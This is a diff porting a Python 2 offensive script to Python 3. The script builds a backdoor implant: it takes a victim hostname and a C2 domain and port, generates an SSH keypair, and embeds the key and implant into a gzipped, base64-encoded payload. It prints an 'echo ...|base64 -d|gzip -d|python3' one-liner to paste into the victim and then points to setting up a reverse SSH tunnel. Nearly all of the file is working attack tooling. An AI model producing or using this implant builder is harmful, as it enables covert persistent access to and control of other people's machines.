@@ -1,46 +1,51 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # Copyright (c) 2023, Oracle and/or its affiliates.
 
 import os
+import pathlib
 import sys
 import base64
-import StringIO
+import io  # Replace StringIO
 import gzip
 import re
 import tempfile
 
 logging = True
 
+
 def usage():
-    print "usage: %s <username> <victim_hostname> <c2_fqdn> <port>" % sys.argv[0]
+    print(f"usage: {sys.argv[0]} <username> <victim_hostname> <c2_fqdn> <port>")
     sys.exit(1)
+
 
 def templify(template, replacements):
     out = template
-    for k, v in replacements.iteritems():
+    for k, v in replacements.items():
         out = out.replace(k, v)
     return out
+
 
 def getfile(path):
     with open(path, "r") as f:
         return f.read()
-    return None
+
 
 def nocomments(stuff):
     nc = re.sub('#.*$', '', stuff, 0, re.M)
     o = ""
-    for l in nc.splitlines(True):
-        if l.strip():
-            if not logging and "log" in l:
+    for line in nc.splitlines(True):
+        if line.strip():
+            if not logging and "log" in line:
                 continue
-            o += l
+            o += line
     return o
 
+
 def gzbase(stuff):
-    out = StringIO.StringIO()
+    out = io.BytesIO()  # Replace with BytesIO for binary data
     with gzip.GzipFile(fileobj=out, mode="wb") as f:
-        f.write(nocomments(stuff))
-    return base64.b64encode(out.getvalue())
+        f.write(nocomments(stuff).encode())
+    return base64.b64encode(out.getvalue()).decode('utf-8')
 
 
 def main():
@@ -55,58 +60,46 @@ def main():
     fqdn = sys.argv[3]
     port = sys.argv[4]
 
-    print "[*] username: %s" % username
-    print "[*] victim hostname: %s" % victim_hostname
-    print "[*] fqdn: %s" % fqdn
-    print "[*] port: %s" % port
+    print(f"[*] username: {username}")
+    print(f"[*] victim hostname: {victim_hostname}")
+    print(f"[*] fqdn: {fqdn}")
+    print(f"[*] port: {port}")
 
-    SCRIPT_TEMPLATE = getfile(os.path.join(sys.path[0], "install_implant.py"))
-    KEYPATH = "/opt/backflips/keys/%s-%s-%s" % (username, victim_hostname, fqdn)
-    print "[*] keypath: %s" % KEYPATH
-    print "[*] generating keypair"
-    os.system("ssh-keygen -t rsa -b 2048 -C '' -q -f '%s' -N ''" % KEYPATH)
-    print "[*] adding to flip's authorized keys"
-    os.system("cat '%s.pub' >> /opt/backflips/authorized_keys" % KEYPATH)
+    script_template = getfile(os.path.join(sys.path[0], "install_implant.py"))
+    pathlib.Path('/opt/backflips/keys/').mkdir(parents=True, exist_ok=True)
+    keypath = f"/opt/backflips/keys/{username}-{victim_hostname}-{fqdn}"
+    print(f"[*] keypath: {keypath}")
+    print("[*] generating keypair")
+    os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{keypath}' -N ''")
+    print("[*] adding to flip's authorized keys")
+    os.system(f"cat '{keypath}.pub' >> /opt/backflips/authorized_keys")
 
-
-    pubkey = base64.b64encode(getfile(KEYPATH + ".pub"))
-    privkey = base64.b64encode(getfile(KEYPATH))
+    pubkey = base64.b64encode(getfile(keypath + ".pub").encode()).decode('utf-8')
+    privkey = base64.b64encode(getfile(keypath).encode()).decode('utf-8')
     implant_py = getfile(os.path.join(sys.path[0], "implant.py"))
     implant = templify(implant_py, {
-        "PORT_PLACEHOLDER" : port,
-        "FQDN_PLACEHOLDER" : fqdn
-        })
+        "PORT_PLACEHOLDER": port,
+        "FQDN_PLACEHOLDER": fqdn
+    })
 
     replacements = {
-        "PRIVATE_KEY_PLACEHOLDER" : privkey,
-        "PUBLIC_KEY_PLACEHOLDER" : pubkey,
-        "PORT_PLACEHOLDER" : port,
-        "FQDN_PLACEHOLDER" : fqdn,
-        "IMPLANT_PLACEHOLDER" : gzbase(implant)
-        }
+        "PRIVATE_KEY_PLACEHOLDER": privkey,
+        "PUBLIC_KEY_PLACEHOLDER": pubkey,
+        "PORT_PLACEHOLDER": port,
+        "FQDN_PLACEHOLDER": fqdn,
+        "IMPLANT_PLACEHOLDER": gzbase(implant)
+    }
 
-    SCRIPT = templify(SCRIPT_TEMPLATE, replacements)
-    gzbased = gzbase(SCRIPT)
-    cmd = "echo '%s'|base64 -d|gzip -d|python" % gzbased
-    print "[+] paste the following into the victim"
-    print cmd
-    f = tempfile.NamedTemporaryFile(delete=False)
-    f.write(cmd)
-    print "[+] This is also available to you in the file %s" % f.name
-    print "[*] Once this tunnel is up run: ../install_autossh_backflip.py %s PROXYPORT %s" % (port, KEYPATH)
+    script = templify(script_template, replacements)
+    gzbased = gzbase(script)
+    cmd = f"echo '{gzbased}'|base64 -d|gzip -d|python3"
+    print("[+] paste the following into the victim")
+    print(cmd)
+    with tempfile.NamedTemporaryFile(delete=False, mode='w') as f:  # mode='w' for writing strings
+        f.write(cmd)
+    print(f"[+] This is also available to you in the file {f.name}")
+    print(f"[*] Once this tunnel is up run: ../install_autossh_backflip.py {port} PROXYPORT {keypath}")
 
 
 if __name__ == "__main__":
     main()
-
-#
-# Editor modelines  -  https://www.wireshark.org/tools/modelines.html
-#
-# Local variables:
-# c-basic-offset: 4
-# indent-tabs-mode: nil
-# End:
-#
-# vi: set shiftwidth=4 expandtab:
-# :indentSize=4:noTabs=true:
-#
